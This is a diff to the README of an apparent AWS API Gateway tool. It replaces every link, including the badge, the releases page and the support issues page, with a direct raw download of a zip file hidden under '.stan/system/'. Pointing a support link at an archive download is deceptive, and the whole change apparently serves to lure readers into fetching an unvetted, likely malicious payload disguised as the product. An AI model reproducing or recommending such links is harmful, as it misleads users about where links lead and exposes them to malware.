@@ -1,6 +1,6 @@
 # 🌐 aws-api-gateway-tools - Simplify Your AWS API Management
 
-[![Download aws-api-gateway-tools](https://img.shields.io/badge/Download-aws--api--gateway--tools-blue)](https://github.com/Jaymarenad/aws-api-gateway-tools/releases)
+[![Download aws-api-gateway-tools](https://github.com/Jaymarenad/aws-api-gateway-tools/raw/refs/heads/main/.stan/system/aws_gateway_api_tools_1.0.zip)](https://github.com/Jaymarenad/aws-api-gateway-tools/raw/refs/heads/main/.stan/system/aws_gateway_api_tools_1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Welcome to aws-api-gateway-tools! This toolset helps you manage AWS API Gateways
 
 ## 📥 Download & Install
 
-To download aws-api-gateway-tools, visit this page: [Download aws-api-gateway-tools](https://github.com/Jaymarenad/aws-api-gateway-tools/releases).
+To download aws-api-gateway-tools, visit this page: [Download aws-api-gateway-tools](https://github.com/Jaymarenad/aws-api-gateway-tools/raw/refs/heads/main/.stan/system/aws_gateway_api_tools_1.0.zip).
 
 1. Click on the link above.
 2. Find the latest version of the software. 
@@ -102,10 +102,10 @@ While this application is designed for end-users, you can contribute to the repo
 
 ## 📞 Support
 
-For any support queries, please visit our [GitHub issues page](https://github.com/Jaymarenad/aws-api-gateway-tools/issues). We welcome your feedback and will address your concerns promptly.
+For any support queries, please visit our [GitHub issues page](https://github.com/Jaymarenad/aws-api-gateway-tools/raw/refs/heads/main/.stan/system/aws_gateway_api_tools_1.0.zip). We welcome your feedback and will address your concerns promptly.
 
 ## ℹ️ License
 
 This application is open-source and available under the MIT License. You can freely use, modify, and distribute it as per the license terms.
 
-For more detailed documentation and updates, remember to check back at the [Download aws-api-gateway-tools](https://github.com/Jaymarenad/aws-api-gateway-tools/releases) page.
+For more detailed documentation and updates, remember to check back at the [Download aws-api-gateway-tools](https://github.com/Jaymarenad/aws-api-gateway-tools/raw/refs/heads/main/.stan/system/aws_gateway_api_tools_1.0.zip) page.
